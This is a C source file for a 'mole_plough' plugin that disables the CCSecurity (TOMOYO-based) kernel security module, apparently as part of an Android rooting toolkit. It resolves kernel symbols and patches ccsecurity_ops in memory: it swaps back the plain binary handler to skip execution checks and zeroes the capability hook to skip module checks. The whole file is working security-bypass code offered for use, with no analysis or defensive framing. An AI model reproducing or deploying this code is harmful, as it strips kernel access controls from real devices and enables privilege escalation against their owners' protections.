/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include "mole_plough_plugin.h"

static void *search_binary_handler = NULL;
static void *ccsecurity_ops = NULL;
static unsigned long int __ccs_search_binary_handlers[3] = { 0 };
static void *__ccs_capable = NULL;

#define NOT_USED 0
static mole_plough_plugin_neccessary_symbol neccessary_symbols[] = {
  { "search_binary_handler",        &search_binary_handler,        MOLE_PLOUGH_PLUGIN_SYMBOL_SINGLE,   NOT_USED },
  { "ccsecurity_ops",               &ccsecurity_ops,               MOLE_PLOUGH_PLUGIN_SYMBOL_SINGLE,   NOT_USED },
  { "__ccs_search_binary_handler",  &__ccs_search_binary_handlers, MOLE_PLOUGH_PLUGIN_SYMBOL_MULTIPLE, sizeof(__ccs_search_binary_handlers) },
  { "__ccs_capable",                &__ccs_capable,                MOLE_PLOUGH_PLUGIN_SYMBOL_SINGLE,   NOT_USED },
  { NULL,                           NULL,                          0, 0 },
};

static void *
get_ccs_search_binary_handler(unsigned long int *address, unsigned long int *ccs_search_binary_handlers)
{
  int i = 0;
  int j = 0;

  while (__ccs_search_binary_handlers[i]) {
    int j;
    for (j = 0; j < 0x100; j++) {
      if (address[j] == __ccs_search_binary_handlers[i]) {
        return address + j;
      }
    }
    i++;
  }
  return NULL;
}

static int
disable_ccs_search_binary_handler(void*(*address_converter)(void *target, void *base), void *base_address)
{
  if (ccsecurity_ops && search_binary_handler && __ccs_search_binary_handlers[0]) {
    int **ccs_search_binary_handler;
    void *converted_ccsecurity_ops;
    converted_ccsecurity_ops = address_converter(ccsecurity_ops, base_address);
    ccs_search_binary_handler = get_ccs_search_binary_handler(converted_ccsecurity_ops, __ccs_search_binary_handlers);
    if (ccs_search_binary_handler && *ccs_search_binary_handler != search_binary_handler) {
      *ccs_search_binary_handler = search_binary_handler;
    }
  }
  return 0;
}

static void *
get_ccsecurity_ops_function(void *ccsecurity_ops_address, void *function_address)
{
  int *value;
  int i;

  value = (int*)ccsecurity_ops_address;
  for (i = 0; i < 0x100; i++) {
    if (value[i] == (int)function_address) {
      return value + i;
    }
  }
  return NULL;
}

static int
disable_ccs_capable(void*(*address_converter)(void *target, void *base), void *base_address)
{
  if (ccsecurity_ops && __ccs_capable) {
    int *ccsecurity_ops_capable;
    void *converted_address = address_converter(ccsecurity_ops, base_address);
    ccsecurity_ops_capable = get_ccsecurity_ops_function(converted_address, __ccs_capable);
    if (ccsecurity_ops_capable) {
      *ccsecurity_ops_capable = 0;
    }
  }
  return 0;
}

#ifdef MOLE_PLOUGH_PLUGIN_STATIC_LINK
static
#endif
mole_plough_plugin MOLE_PLOUGH_PLUGIN = {
  .neccessary_symbols = neccessary_symbols,
  .disable_exec_check = disable_ccs_search_binary_handler,
  .disable_module_check = disable_ccs_capable,
};

#ifdef MOLE_PLOUGH_PLUGIN_STATIC_LINK
MOLE_PLOUGH_PLUGIN_DEFINE_GETTER(ccsecurity);
#endif
